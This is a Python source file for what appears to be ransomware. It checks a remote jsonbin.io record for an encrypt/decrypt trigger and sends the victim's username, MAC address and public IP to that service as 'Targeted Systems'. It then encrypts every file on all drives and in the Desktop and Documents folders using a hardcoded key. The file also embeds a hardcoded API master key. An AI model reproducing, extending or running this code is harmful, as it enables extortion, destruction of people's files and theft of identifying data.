from json import loads
from os import getlogin, sep
from pathlib import Path
from DirectoryWalker import DirectoryWalker
from Encryptor import Encryptor
from Crypto.Cipher import AES
from requests import get, post
from getmac import get_mac_address


walker = DirectoryWalker()
encryptor = Encryptor(key="EncryptFiles")
# global shouldEncrypt
# global shouldDecrypt

shouldEncrypt = False
shouldDecrypt = False


def CheckPermissions():
    # try:
    if(get("https://www.google.com/").status_code == 200):
        binUrl = 'https://api.jsonbin.io/v3/b/61f8fb05fb3ece3ad7cf5904/latest'
        headers = {
            'X-Master-Key': '$2b$10$hzoPclryt/0WzJ5ra.DiMeLJQuhgS5Qid2wSEryvKJB4D7.d8QMZy'
        }
        jsonObj = loads(get(
            binUrl).content)
        print(jsonObj)
        # Modifying the variables to make them global
        global shouldEncrypt
        global shouldDecrypt
        print(shouldDecrypt)
        if(jsonObj['record']["EncryptFiles"] == 'true'):
            shouldEncrypt = True
        if(jsonObj['record']["DecryptFiles"] == 'true'):
            shouldDecrypt = True
    else:
        print("No internet, exiting...")
    # except:
    #     pass


def RecordTargetedSystems():
    url = 'https://api.jsonbin.io/b'
    headers = {
        'Content-Type': 'application/json',
        'secret-key': '$2b$10$hzoPclryt/0WzJ5ra.DiMeLJQuhgS5Qid2wSEryvKJB4D7.d8QMZy',
        'name': getlogin()
    }
    data = {
        "Targeted Systems": {
            "UserName": getlogin(),
            "MAC Address": f"{get_mac_address()}",
            "IPAddress": format(get('https://api.ipify.org').content.decode('utf8'))
        }
    }

    req = post(url, json=data, headers=headers)
    print(req.text)


def EncryptDriveFiles(path):
    print("Entered EncryptDriveFiles")
    # print("Receved parameters are:  ")
    # print(locals())
    fileList = walker.GetFilesList(path)
    for file in fileList:
        encryptor.encrypt_file(file)
        print(file)


CheckPermissions()
# Encryption starts only if the 'EncryptFiles' flag is true in the config
if(shouldEncrypt):
    targetList = []
    targetList = walker.GetDrives()
    RecordTargetedSystems()
    for drive in targetList:
        EncryptDriveFiles(drive)

    targetList.clear()
    targetList.append(str(Path.home()) + sep + "Desktop")
    targetList.append(str(Path.home()) + sep + "Documents")

    for drive in targetList:
        EncryptDriveFiles(drive)
else:
    print("Permission denied, exiting...")


''' Multi threaded execution trial '''
# print("Starting encryption")
# threads = []
# driveList = walker.GetDrives()
# for drive in driveList:
#     t = threading.Thread(target=EncryptDriveFiles, args=(drive))
#     threads.append(t)
#     print("Starting thread")
#     t.start()

# for thread in threads:
#     thread.join()
